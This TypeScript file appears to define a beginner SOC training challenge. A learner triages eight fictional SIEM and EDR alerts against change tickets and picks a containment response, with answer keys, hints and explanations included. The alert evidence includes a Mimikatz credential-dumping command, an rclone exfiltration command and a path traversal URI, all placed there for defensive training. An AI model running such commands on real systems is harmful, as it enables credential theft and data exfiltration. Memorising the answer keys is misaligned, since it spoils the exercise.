// ============================================================
// Challenge: cc-so-01 — Alert Triage
// Room: Security Operations | Difficulty: Beginner
//
// Scenario:
//   The user plays the role of a Tier 1 SOC Analyst at Veridian
//   Logistics starting their morning shift. They must review a queue
//   of eight incoming SIEM and EDR alerts.
//   By cross-referencing shift handover notes, approved change tickets,
//   and technical context, the analyst must classify each alert as
//   either "Investigate" or "Dismiss as explained activity", and then
//   select the safest containment response for the most critical alert.
//
// All domains use RFC 2606 .example TLDs.
// All IPs use RFC 5737 documentation addresses.
// All organizations and personas are entirely fictional.
// ============================================================

import type { Challenge } from '../../types';

export const challengeCC_SO_01: Challenge = {
  id: 'cc-so-01',
  roomId: 'secops',
  difficulty: 'beginner',
  title: 'Alert Triage',
  briefing:
    'You are a new Tier 1 SOC Analyst at Veridian Logistics. Eight security alerts have accumulated in the unassigned queue during the morning shift transition. Review each alert alongside the shift handover notes and approved maintenance schedule. Classify each alert as either "Investigate" or "Dismiss as explained activity", then determine the safest next step for the most critical incident.',

  // ── Evidence ──────────────────────────────────────────────────────────────
  evidence: [
    {
      id: 'ev-alerts',
      type: 'log',
      label: 'SIEM Triage Queue (8 Alerts)',
      content: {
        isAlertQueue: true,
        shiftInfo: {
          team: 'Global SOC — Tier 1 Triage Queue',
          date: 'Tuesday, 29 Sep 2026',
          queueName: 'Pending Analyst Review (Shift 08:00 – 16:00 UTC)',
        },
        alerts: [
          {
            id: 'alt-201',
            timestamp: '08:12:15 UTC',
            severity: 'medium',
            rule: 'Endpoint EDR / Mimikatz Memory Artifact',
            affectedSystem: 'FIN-WS-014 (s.chen@veridian-logistics.example)',
            description:
              'LSASS process memory access detected: suspicious handle opened by unknown executable (svchost_update.exe in C:\\Users\\s.chen\\AppData\\Local\\Temp).',
            context:
              'Finance department workstation. No change tickets filed for this host. User reported their system running sluggishly after opening an email attachment earlier this morning.',
            details: {
              sourceIp: '198.51.100.14',
              processPath: 'C:\\Users\\s.chen\\AppData\\Local\\Temp\\svchost_update.exe',
              commandLine: 'svchost_update.exe sekurlsa::logonpasswords',
              rawLog:
                'EVENT_ID: 10 | TargetImage: C:\\Windows\\system32\\lsass.exe | GrantedAccess: 0x1010 | SourceImage: svchost_update.exe',
            },
          },
          {
            id: 'alt-202',
            timestamp: '08:35:40 UTC',
            severity: 'low',
            rule: 'Network NIDS / Mass Port Sweep Detected',
            affectedSystem: 'Internal Subnet 198.51.100.0/24',
            description:
              'TCP SYN sweep across ports 22, 80, 443, 3389, 8080 targeting 64 internal hosts in under 3 minutes.',
            context:
              'Originating IP 198.51.100.25 is verified vulnerability scanner vuln-scanner-01.veridian-logistics.example. Change ticket CHG-8910 pre-approved this weekly internal vulnerability assessment window (08:30 – 10:00 UTC).',
            details: {
              sourceIp: '198.51.100.25',
              destIp: '198.51.100.0/24',
              rawLog:
                'RULE_ID: NIDS-SCAN-102 | Proto: TCP | Flags: SYN | Packets/sec: 1420 | Scanner_Host: vuln-scanner-01',
            },
          },
          {
            id: 'alt-203',
            timestamp: '09:04:18 UTC',
            severity: 'high',
            rule: 'Identity Provider (IdP) / Impossible Travel Anomaly',
            affectedSystem: 'v.sterling@veridian-logistics.example (CEO Account)',
            description:
              'Successful OAuth login to Executive OneDrive from IP 203.0.113.195 (Sofia, Bulgaria). Previous successful login was 22 minutes earlier from 198.51.100.88 (Tokyo, Japan).',
            context:
              'CEO Victoria Sterling is confirmed on business travel in Tokyo (Tokyo Logistics Summit). No travel to Bulgaria is scheduled, and Veridian has no corporate VPN or branch office in Sofia.',
            details: {
              sourceIp: '203.0.113.195 (Sofia, BG)',
              rawLog:
                'AUTH_EVT: Success | User: v.sterling | App: OneDrive_Business | Distance: 5,680 miles | Elapsed: 22m 14s | Risk: High',
            },
          },
          {
            id: 'alt-204',
            timestamp: '09:42:05 UTC',
            severity: 'medium',
            rule: 'Host IDS / Excessive Failed SSH Logins',
            affectedSystem: 'db-backup-02.internal.veridian-logistics.example (Account: svc_veeam_backup)',
            description:
              '12 consecutive failed SSH authentication attempts within 45 seconds followed by a successful login from 198.51.100.50.',
            context:
              'Shift handover notes record service account password rotation under ticket SEC-3301 at 09:40 UTC. The backup orchestrator used an expired cached credential before pulling the rotated secret from CyberArk Vault.',
            details: {
              sourceIp: '198.51.100.50 (backup-controller.internal)',
              destIp: '198.51.100.52',
              rawLog:
                'SSHD_AUTH_FAIL: 12 attempts | User: svc_veeam_backup | Final: Accepted publickey for svc_veeam_backup',
            },
          },
          {
            id: 'alt-205',
            timestamp: '10:15:33 UTC',
            severity: 'high',
            rule: 'Active Directory / Kerberoasting TGS Spike',
            affectedSystem: 'DC-01.veridian-logistics.example (Target: MSSQLSvc/sql-cluster:1433)',
            description:
              'Unusual Kerberos TGS ticket request with legacy RC4 encryption (0x17) requested for 18 service principal names (SPNs) in rapid succession by workstation MKT-WS-088.',
            context:
              'Workstation assigned to a junior marketing contractor (j.morales). Marketing workstations have no business querying SQL server SPNs or requesting bulk RC4 service tickets.',
            details: {
              sourceIp: '198.51.100.88 (MKT-WS-088)',
              commandLine: 'Event 4769: A Kerberos service ticket was requested. Ticket Encryption: 0x17 (RC4)',
              rawLog:
                'TGS_REQUEST_SPIKE: Count=18 | Encryption=0x17 | TargetSPN=MSSQLSvc/sql-cluster.veridian-logistics.example:1433',
            },
          },
          {
            id: 'alt-206',
            timestamp: '10:50:12 UTC',
            severity: 'low',
            rule: 'Web Application Firewall (WAF) / Path Traversal Blocked',
            affectedSystem: 'customer-portal.veridian-logistics.example (Public Web App)',
            description:
              'Blocked 1 isolated HTTP GET request containing "../etc/passwd" in URL query string from external IP 203.0.113.88. HTTP 403 Forbidden returned.',
            context:
              'Standard Internet automated crawler background noise. The WAF stopped the probe at the perimeter; the backend web application was not reached and no follow-up requests were observed.',
            details: {
              sourceIp: '203.0.113.88',
              rawLog:
                'WAF_ACTION: BLOCK_403 | URI: /catalog?item=../../../../etc/passwd | User-Agent: MozScan/2.1 | Bytes_Sent: 0',
            },
          },
          {
            id: 'alt-207',
            timestamp: '11:22:45 UTC',
            severity: 'critical',
            rule: 'EDR & SIEM / Encrypted Outbound Data Spike',
            affectedSystem: 'SRV-FILE-01 (Core Corporate File Server)',
            description:
              '18.4 GB of compressed archives transferred over port 443 to unknown external IP 198.51.100.222 via rclone.exe. Process running from C:\\ProgramData\\temp_diag.',
            context:
              'Core file server containing confidential intellectual property and customer records. No scheduled offsite backups occur at 11:22 UTC. Rclone is not an approved enterprise tool and was executed under compromised service credentials.',
            details: {
              sourceIp: '198.51.100.10 (SRV-FILE-01)',
              destIp: '198.51.100.222:443',
              processPath: 'C:\\ProgramData\\temp_diag\\rclone.exe',
              commandLine: 'rclone.exe copy "D:\\CorporateData\\Confidential" remote:exfil --transfers 8',
              rawLog:
                'NET_FLOW: Outbound_Bytes: 18,432,000,000 | Proto: TCP/443 | Image: rclone.exe | Threat: Data Exfiltration',
            },
          },
          {
            id: 'alt-208',
            timestamp: '11:45:10 UTC',
            severity: 'low',
            rule: 'Cloud IAM / New Policy Attached to Production Role',
            affectedSystem: 'AWS/Cloud Account: veridian-prod-infra (Role: KubeNodeAutoScalerRole)',
            description:
              'Managed policy "AmazonEKSClusterAutoscalerPolicy" attached to IAM role "KubeNodeAutoScalerRole".',
            context:
              'Cloud Infrastructure change ticket INFRA-9042 was approved by Principal Cloud Architect Jordan Ellis and the CISO office for the 11:30 – 12:00 UTC maintenance window. The ticket authorizes attaching the official least-privilege policy (strictly scoped to EC2 AutoScaling actions: Describe*, SetDesiredCapacity, TerminateInstanceInAutoScalingGroup) following an EKS cluster upgrade. No administrative, wildcard, or privilege escalation permissions are granted.',
            details: {
              sourceIp: '198.51.100.2 (deployer-runner.internal)',
              commandLine:
                'aws iam attach-role-policy --role-name KubeNodeAutoScalerRole --policy-arn arn:aws:iam::198511000001:policy/AmazonEKSClusterAutoscalerPolicy',
              rawLog:
                'EVENT: AttachRolePolicy | Role: KubeNodeAutoScalerRole | Policy: AmazonEKSClusterAutoscalerPolicy | Ticket: INFRA-9042 | Principal: arn:aws:iam::198511000001:role/CICD-Deployer | Status: Success',
            },
          },
        ],
      },
    },
    {
      id: 'ev-handover',
      type: 'policy',
      label: 'Shift Handover & Maintenance Calendar',
      content: {
        type: 'directory',
        company: 'Veridian Logistics SOC — Operations Calendar & Handover',
        employee: {
          name: 'Elena Rostova',
          title: 'SOC Lead Analyst (Alpha Shift)',
          department: 'Security Operations Center',
          officialEmail: 'e.rostova@veridian-logistics.example',
          internalPhone: '+1 (555) 0192, Ext. 4108',
          officeLocation: 'HQ Building C, SOC Floor',
          assistant: 'SOC Incident Bridge: Ext. 4999',
          currentStatus: 'On Duty — Alpha Shift Lead (08:00 – 16:00 UTC)',
        },
        policy: {
          code: 'SOP-102',
          title: 'Shift Handover & Approved Maintenance Schedule',
          rules: [
            'Approved Change CHG-8910 (08:30 – 10:00 UTC): Weekly vulnerability assessment scan from authorized host vuln-scanner-01 (198.51.100.25) across internal subnet 198.51.100.0/24.',
            'Approved Change SEC-3301 (09:40 UTC): Scheduled service account password rotation for svc_veeam_backup. Transient SSH authentication failures expected while orchestrator updates from CyberArk Vault.',
            'Approved Change INFRA-9042 (11:30 – 12:00 UTC): Cloud infrastructure EKS upgrade attaching least-privilege policy AmazonEKSClusterAutoscalerPolicy to KubeNodeAutoScalerRole. Pre-approved by Principal Architect and CISO office; strictly scoped to AutoScaling operations (no wildcard or administrative rights).',
            'Triage Guideline 1: Operational maintenance with verified matching tickets and scheduled windows can be safely dismissed. However, never dismiss an alert based on a single weak factor (such as an internal IP address or standard port).',
            'Triage Guideline 2: Active credential theft (LSASS dumping, Kerberoasting) or ongoing data exfiltration requires immediate EDR host containment and memory preservation. Never reboot active systems during incident triage.',
          ],
        },
      },
    },
  ],

  // ── Steps ─────────────────────────────────────────────────────────────────
  //
  // Step 1 (70 pts): Classify all 8 alerts (classification, 8 items = 8.75 pts each, partial credit)
  // Step 2 (30 pts): Choose safe operational response for ALT-207 (single-choice, no partial)
  //
  // Total: 100 pts. Pass threshold: 70.
  steps: [
    {
      id: 'step-triage',
      prompt:
        'Review the 8 alerts in your shift queue alongside the shift handover notes and maintenance calendar. Classify each alert as either "Investigate" (requires analyst triage/containment) or "Dismiss as explained activity" (verified benign operational activity).',
      interaction: 'classification',
      partialCreditAllowed: true,
      pointValue: 70,
      items: [
        {
          id: 'alt-201',
          label: 'ALT-201: Endpoint EDR / Mimikatz Memory Artifact (FIN-WS-014)',
          options: ['Investigate', 'Dismiss as explained activity'],
        },
        {
          id: 'alt-202',
          label: 'ALT-202: Network NIDS / Mass Port Sweep (vuln-scanner-01)',
          options: ['Investigate', 'Dismiss as explained activity'],
        },
        {
          id: 'alt-203',
          label: 'ALT-203: IdP / Impossible Travel Anomaly (v.sterling)',
          options: ['Investigate', 'Dismiss as explained activity'],
        },
        {
          id: 'alt-204',
          label: 'ALT-204: Host IDS / Excessive Failed SSH Logins (svc_veeam_backup)',
          options: ['Investigate', 'Dismiss as explained activity'],
        },
        {
          id: 'alt-205',
          label: 'ALT-205: Active Directory / Kerberoasting TGS Spike (MKT-WS-088)',
          options: ['Investigate', 'Dismiss as explained activity'],
        },
        {
          id: 'alt-206',
          label: 'ALT-206: WAF / Path Traversal Blocked (customer-portal)',
          options: ['Investigate', 'Dismiss as explained activity'],
        },
        {
          id: 'alt-207',
          label: 'ALT-207: EDR & SIEM / Outbound Data Spike (SRV-FILE-01)',
          options: ['Investigate', 'Dismiss as explained activity'],
        },
        {
          id: 'alt-208',
          label: 'ALT-208: Cloud IAM / AutoScaling Policy Attached (KubeNodeAutoScalerRole)',
          options: ['Investigate', 'Dismiss as explained activity'],
        },
      ],
      answerKey: {
        'alt-201': 'Investigate',
        'alt-202': 'Dismiss as explained activity',
        'alt-203': 'Investigate',
        'alt-204': 'Dismiss as explained activity',
        'alt-205': 'Investigate',
        'alt-206': 'Dismiss as explained activity',
        'alt-207': 'Investigate',
        'alt-208': 'Dismiss as explained activity',
      },
    },
    {
      id: 'step-containment',
      prompt:
        'Alert ALT-207 represents an active critical incident: 18.4 GB of data exfiltration in progress from core file server SRV-FILE-01 via an unapproved rclone process. What is the immediate, safest next step for this alert?',
      interaction: 'single-choice',
      partialCreditAllowed: false,
      pointValue: 30,
      items: [
        {
          id: 'resp-isolate-kill',
          label:
            'Immediately isolate SRV-FILE-01 from the network via EDR containment, terminate the rogue rclone process, capture volatile memory for forensic analysis, and escalate to the Incident Commander.',
        },
        {
          id: 'resp-email-admin',
          label:
            'Send an email to the file server administrator asking if they are testing a cloud backup tool, and wait for their response before taking containment action.',
        },
        {
          id: 'resp-block-ip-only',
          label:
            'Add the destination IP (198.51.100.222) to the perimeter firewall blocklist, leaving the file server running so users don\'t experience a service disruption.',
        },
        {
          id: 'resp-reboot-server',
          label:
            'Reboot the file server immediately to clear the memory and reset all network connections.',
        },
      ],
      answerKey: { chosen: 'resp-isolate-kill' },
    },
  ],

  // ── Hints ─────────────────────────────────────────────────────────────────
  hints: [
    'Cross-reference the timestamp, source host, and ticket references of each alert with the Shift Handover and Maintenance Calendar. Scheduled vulnerability assessments, password rotations, and approved cloud maintenance with matching tickets can be safely dismissed.',
    'Do not dismiss an alert based on a single weak factor (such as coming from an internal IP address or using standard ports). Attackers frequently operate from compromised internal workstations.',
    'For ALT-207, massive outbound data transfer to an unknown external destination using an unapproved binary is an active data exfiltration incident. Prioritize host containment and volatile evidence preservation over rebooting or waiting for email responses.',
  ],

  // ── Skills ────────────────────────────────────────────────────────────────
  skills: [
    'alert-triage',
    'siem-investigation',
    'incident-classification',
    'containment-strategy',
    'change-management-correlation',
  ],

  // ── Scoring ───────────────────────────────────────────────────────────────
  passThreshold: 70,

  // ── Explanations ─────────────────────────────────────────────────────────
  successExplanation:
    'Outstanding triage work! You correctly distinguished genuine threats from benign operational noise, and selected the appropriate containment protocol for the critical exfiltration incident.\n\nAlert Analysis Breakdown:\n- ALT-201 (Investigate): EDR detected a fake svchost executable in AppData dumping LSASS memory on a finance PC following a suspicious email attachment. Classic credential theft.\n- ALT-202 (Dismiss): Mass SYN sweep originated from authorized internal scanner vuln-scanner-01 operating within approved maintenance window CHG-8910.\n- ALT-203 (Investigate): CEO account logged into OneDrive from Bulgaria only 22 minutes after a session in Tokyo. The 5,600-mile impossible travel anomaly indicates token theft or compromised credentials.\n- ALT-204 (Dismiss): Temporary SSH failure burst on backup server caused by scheduled service account password rotation under ticket SEC-3301 before CyberArk Vault updated the cached key.\n- ALT-205 (Investigate): Contractor workstation requesting 18 Kerberos service tickets with weak legacy RC4 encryption is a textbook Kerberoasting attack to crack service account passwords offline.\n- ALT-206 (Dismiss): Commodity web path traversal probe stopped at the edge by the WAF with 403 Forbidden. Zero backend impact or follow-up activity.\n- ALT-207 (Investigate): Critical data exfiltration: unauthorized rclone utility uploading 18.4 GB of confidential corporate data to an unknown external IP.\n- ALT-208 (Dismiss): The policy attached to KubeNodeAutoScalerRole is the official least-privilege AmazonEKSClusterAutoscalerPolicy (strictly scoped to EC2 autoscaling API actions, with zero wildcard administrative permissions), matching pre-approved change ticket INFRA-9042 executed during the scheduled 11:30–12:00 UTC window by the authorized CI/CD runner. Critical lesson: An alert attaching full AdministratorAccess should NEVER be dismissed merely because a change ticket is cited; dismissal is only valid here because the policy itself was verified to be strictly least-privilege and appropriate for the role.\n\nContainment Action:\nFor ALT-207, immediate network isolation via EDR containment stops ongoing exfiltration while preserving volatile memory artifacts. Waiting for email confirmations allows the adversary to finish data theft, while rebooting destroys in-memory forensics.',

  failureExplanation:
    'Effective SOC alert triage requires verifying environmental context and distinguishing authorized operational maintenance from genuine indicators of compromise (IoCs).\n\nDetailed Review of Shift Alerts:\n- Threats requiring investigation:\n  • ALT-201: LSASS memory dumping from AppData (Mimikatz credential harvesting).\n  • ALT-203: Impossible travel anomaly on CEO account (Tokyo to Bulgaria in 22 minutes).\n  • ALT-205: Bulk RC4 Kerberos TGS ticket requests from a marketing PC (Kerberoasting).\n  • ALT-207: Active 18.4 GB data exfiltration via rogue rclone process.\n\n- Explained operational events that should be dismissed:\n  • ALT-202: Authorized weekly vulnerability scan matching change ticket CHG-8910.\n  • ALT-204: Temporary authentication failures caused by service account rotation under SEC-3301.\n  • ALT-206: Automated web crawler probe blocked at the perimeter by the WAF with zero backend penetration.\n  • ALT-208: Cloud IAM policy change pre-approved under ticket INFRA-9042 attaching least-privilege AmazonEKSClusterAutoscalerPolicy (not excessive admin rights).\n\nKey Triage Principles:\n- Never dismiss an IAM alert based solely on the existence of a change ticket. Always inspect the attached policy permissions: if an alert shows AdministratorAccess or wildcard \'*:*\' attached to a service role, it requires immediate investigation regardless of a ticket. Here, dismissal was correct because the policy was verified to be narrowly scoped to autoscaling.\n- Never dismiss alerts merely because they originate from internal IP addresses or use common ports.\n- When active exfiltration is detected (ALT-207), immediately isolate the host via EDR. Do not reboot (which erases volatile RAM evidence) or delay by emailing users.',

  shuffleItems: false,
};
